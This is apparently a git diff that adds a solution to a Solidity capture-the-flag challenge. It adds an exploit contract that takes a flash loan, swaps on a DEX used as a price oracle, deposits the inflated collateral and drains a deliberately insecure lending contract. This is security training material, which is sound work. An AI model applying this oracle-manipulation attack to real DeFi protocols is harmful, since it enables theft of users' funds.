@@ -12,20 +12,22 @@ import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
 import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
 import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";
 
+import {FlashLoandReceiverSample} from "./Challenge1.t.sol";
+
 contract Challenge3Test is Test {
     // dex & oracle
-    InsecureDexLP oracleDex;
+    InsecureDexLP private oracleDex;
     // flash loan
-    InSecureumLenderPool flashLoanPool;
+    InSecureumLenderPool private flashLoanPool;
     // borrow system, contract target to break
-    BorrowSystemInsecureOracle target;
+    BorrowSystemInsecureOracle private target;
 
     // insecureum token
-    IERC20 token0;
+    IERC20 private token0;
     // boring token
-    IERC20 token1;
+    IERC20 private token1;
 
-    address player = makeAddr("player");
+    address private player = makeAddr("player");
 
     function setUp() public {
         // create the tokens
@@ -64,11 +66,15 @@ contract Challenge3Test is Test {
     function testChallenge() public {
         vm.startPrank(player);
 
-        /*//////////////////////////////
-        //    Add your hack below!    //
-        //////////////////////////////*/
+        Exploit attacker = new Exploit(
+            address(token0),
+            address(token1),
+            address(target),
+            address(oracleDex),
+            address(flashLoanPool)
+        );
 
-        //============================//
+        attacker.attack();
 
         vm.stopPrank();
 
@@ -85,8 +91,53 @@ contract Challenge3Test is Test {
 ////////////////////////////////////////////////////////////*/
 
 contract Exploit {
-    IERC20 token0;
-    IERC20 token1;
-    BorrowSystemInsecureOracle borrowSystem;
-    InsecureDexLP dex;
+    IERC20 private token0;
+    IERC20 private token1;
+    BorrowSystemInsecureOracle private borrowSystem;
+    InsecureDexLP private dex;
+    InSecureumLenderPool private flashLoanPool;
+
+    constructor(
+        address _token0,
+        address _token1,
+        address _borrowSystem,
+        address _dex,
+        address _flashLoanPool
+    ) {
+        token0 = IERC20(_token0);
+        token1 = IERC20(_token1);
+        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
+        dex = InsecureDexLP(_dex);
+        flashLoanPool = InSecureumLenderPool(_flashLoanPool);
+    }
+
+    function attack() external {
+        // approve transfer
+        token0.approve(address(dex), type(uint256).max);
+        token1.approve(address(dex), type(uint256).max);
+
+        token0.approve(address(borrowSystem), type(uint256).max);
+        token1.approve(address(borrowSystem), type(uint256).max);
+
+        // 1 - get tokens from flash loan
+        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+
+        flashLoanPool.flashLoan(
+            address(_flashLoanReceiver),
+            abi.encodeWithSignature("receiveFlashLoan(address)", address(this))
+        );
+
+        uint256 token0CurrentBalance = token0.balanceOf(address(this));
+
+        // 2 - switch token0 for token1 on lp
+        dex.swap(address(token0), address(token1), token0CurrentBalance);
+
+        uint256 token1CurrentBalance = token1.balanceOf(address(this));
+
+        // 3 - deposit token1 on borrow system
+        borrowSystem.depositToken1(token1CurrentBalance);
+
+        // 4 - get all token0 from borrow system
+        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
+    }
 }
